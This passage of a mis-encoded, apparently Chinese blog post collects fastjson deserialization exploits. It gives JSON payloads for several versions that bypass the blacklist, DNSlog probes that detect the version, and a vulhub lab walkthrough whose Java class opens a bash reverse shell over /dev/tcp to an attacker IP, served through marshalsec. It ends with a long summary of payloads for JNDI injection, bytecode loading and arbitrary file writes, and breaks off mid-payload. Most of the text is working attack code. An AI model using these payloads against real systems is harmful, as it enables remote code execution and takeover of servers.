class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[,</span><br><span class="line">    &#123;<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="fastjson1-2-44"><a href="#fastjson1-2-44" class="headerlink" title="fastjson1.2.44"></a>fastjson1.2.44</h4><ol><li>è¿™ä¸ªç‰ˆæœ¬ä¸»è¦æ˜¯ä¿®å¤ä¸Šä¸€ä¸ªç‰ˆæœ¬ä¸­ä½¿ç”¨ <code>[</code> ç»•è¿‡é»‘åå•é˜²æŠ¤çš„é—®é¢˜</li></ol><h4 id="fastjson1-2-45"><a href="#fastjson1-2-45" class="headerlink" title="fastjson1.2.45"></a>fastjson1.2.45</h4><ol><li><p>é»‘åå•ç»•è¿‡</p></li><li><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;properties&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="fastjson1-2-47"><a href="#fastjson1-2-47" class="headerlink" title="fastjson1.2.47"></a>fastjson1.2.47</h4><ol><li><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;su18&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;su19&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="fastjsonç‰ˆæœ¬æ¢æµ‹"><a href="#fastjsonç‰ˆæœ¬æ¢æµ‹" class="headerlink" title="fastjsonç‰ˆæœ¬æ¢æµ‹"></a>fastjsonç‰ˆæœ¬æ¢æµ‹</h2><h4 id="DNSlogæ¢æµ‹"><a href="#DNSlogæ¢æµ‹" class="headerlink" title="DNSlogæ¢æµ‹"></a>DNSlogæ¢æµ‹</h4><ol><li><p>ä»¥ä¸‹POCå‡ºç½‘ï¼Œè¯´æ˜fastjson&lt;&#x3D;1.2.47</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.InetAddress&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;1247.xxxxx.dnslog.cn&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>ä»¥ä¸‹è¿™ä¸ªPOCå‡ºç½‘ï¼Œè¯´æ˜fastjson&gt;&#x3D;1.2.37</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.URL&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://weffewfddd.dnslog.cn&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">:</span><span class="string">&quot;aaa&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>ä»¥ä¸‹è¿™ä¸ªPOCå‡ºç½‘ï¼Œè¯æ˜fastjsonç‰ˆæœ¬å·1.1.16&lt;&#x3D;version&lt;&#x3D;1.2.24</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://xxxdsf.dnslog.cn:9999/POC&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>ä»¥ä¸‹è¿™å‡ ä¸ªPOCï¼Œåªèƒ½è¯æ˜fastjsonå‡ºç½‘ï¼Œæ— æ³•åˆ¤æ–­fastjsonæ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå› ä¸ºæœ€æ–°çš„æ‰“äº†è¡¥ä¸çš„fastjsonä¹Ÿæ˜¯èƒ½å‘èµ·DNSè¯·æ±‚çš„ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet6Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;sdffsd.dnslog.cn&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxxx.dnslog.cn&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.InetSocketAddress&quot;</span><span class="punctuation">&#123;</span><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;wefewffw.dnslog.cn&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="æŠ¥é”™åˆ¤æ–­"><a href="#æŠ¥é”™åˆ¤æ–­" class="headerlink" title="æŠ¥é”™åˆ¤æ–­"></a>æŠ¥é”™åˆ¤æ–­</h4><ol><li><p>æäº¤ä¸€ä¸‹ä¸¤ä¸ªPOCï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œæœ‰æ—¶å€™ä¼šæ˜¾ç¤ºå‡ºfastjsonç‰ˆæœ¬å·æ¥ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span><span class="attr">&quot;test&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">]</span> </span><br><span class="line"></span><br><span class="line">è¾“å…¥ä¸€äº›ä¹±ç å­—ç¬¦ï¼Œè®©webåº”ç”¨æŠ¥é”™ï¼Œæœ‰æ—¶å€™ä¹Ÿä¼šå¸¦å‡ºæ¥ç‰ˆæœ¬å·</span><br></pre></td></tr></table></figure></li></ol><h2 id="vulhubæ¼æ´å¤ç°"><a href="#vulhubæ¼æ´å¤ç°" class="headerlink" title="vulhubæ¼æ´å¤ç°"></a>vulhubæ¼æ´å¤ç°</h2><h4 id="fastjson1-2-24-1"><a href="#fastjson1-2-24-1" class="headerlink" title="fastjson1.2.24"></a>fastjson1.2.24</h4><ol><li><p>dockerå¯åŠ¨ç¯å¢ƒ</p></li><li><p>kaliåˆ›å»ºTouchFileæ–‡ä»¶ç”¨æ¥åå¼¹shellã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">             <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> r.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.5.143/4444 0&gt;&amp;1&quot;</span>&#125;);</span><br><span class="line">             p.waitFor();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"> </span><br><span class="line">           <span class="comment">// do nothing</span></span><br><span class="line">       &#125;</span><br><span class="line"> </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>pythonèµ·ä¸€ä¸ªhttpæœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer</span><br></pre></td></tr></table></figure></li><li><p>marshalsecå¯åŠ¨RMIæœåŠ¡å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.110.141:4433/#TouchFile&quot; 9988</span><br></pre></td></tr></table></figure></li><li><p>kaliä¸Šç”¨NCå¼€å¯ç«¯å£ç›‘å¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure></li><li><p>æŠ“åŒ…æ”¹ä¸ºPOSTåŒ…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.110.141:8090</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 165</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.110.141:9988/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å¼¹åˆ°shell</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220829225041536.png" alt="image-20220829225041536"></p></li></ol><h4 id="fastjson1-2-27"><a href="#fastjson1-2-27" class="headerlink" title="fastjson1.2.27"></a>fastjson1.2.27</h4><h2 id="payloadæ€»ç»“"><a href="#payloadæ€»ç»“" class="headerlink" title="payloadæ€»ç»“"></a>payloadæ€»ç»“</h2><p>JdbcRowSetImpl</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>TemplatesImpl</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;yv66vgA...k=&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    &#x27;_name&#x27;<span class="punctuation">:</span> &#x27;su18&#x27;<span class="punctuation">,</span></span><br><span class="line">    &#x27;_tfactory&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JndiDataSourceFactory</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;data_source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>SimpleJndiBeanFactory</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;targetBeanName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;propertyPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;su18&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;beanFactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;shareableResources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>DefaultBeanFactoryPointcutAdvisor</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;beanFactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">     <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;shareableResources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">       <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">     <span class="punctuation">]</span></span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;adviceBeanName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>WrapperConnectionPoolDataSource</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;userOverridesAsString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HexAsciiSerializedMap:aced000...6f;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JndiRefForwardingDataSource</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;loginTimeout&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>InetAddress</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.InetAddress&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Inet6Address</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.Inet6Address&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>URL</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.URL&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JSONObject</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.URL&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://dnslog.com&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>URLReader</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;poc&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://127.0.0.1:9999&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>AutoCloseable ä»»æ„æ–‡ä»¶å†™å…¥</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/target&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.compress.compressors.gzip.GzipParameters&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;filename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;filecontent&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>BasicDataSource</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A...&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassLoader&quot;</span> <span class="punctuation">:</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Lcom.sun.org.apache.bcel.internal.util.ClassLoader;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>JndiConverter</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;AsText&quot;</span><span 